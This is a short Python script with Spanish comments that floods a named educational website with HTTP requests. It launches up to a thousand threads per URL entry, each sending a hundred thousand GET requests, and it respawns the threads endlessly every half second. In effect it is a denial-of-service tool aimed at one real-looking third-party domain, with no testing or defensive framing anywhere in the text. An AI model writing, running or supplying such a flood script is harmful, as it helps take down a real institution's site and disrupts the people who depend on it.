import requests
import threading
import time

def send_requests(url, request_count):
    for i in range(request_count):
        try:
            response = requests.get(url)
            if response.status_code == 200:
                print("Solicitud exitosa")
            else:
                print("Solicitud fallida")
        except Exception as e:
            print("Error en la solicitud:", e)

urls = ["https://victorfelix.edu.co", "https://victorfelix.edu.co", "https://victorfelix.edu.co"]
max_threads = 1000
threads = []
running = True
request_count = 100000 # cantidad de solicitudes a realizar por hilo

while running:
    # Elimina los hilos que ya terminaron
    threads = [t for t in threads if t.is_alive()]

    # Crea nuevos hilos si es necesario
    for url in urls:
        num_threads = max_threads - len([t for t in threads if t.getName() == url])
        for i in range(num_threads):
            t = threading.Thread(target=send_requests, args=(url, request_count))
            t.setName(url)
            t.start()
            threads.append(t)

    # Espera un tiempo antes de crear más hilos
    time.sleep(0.5)
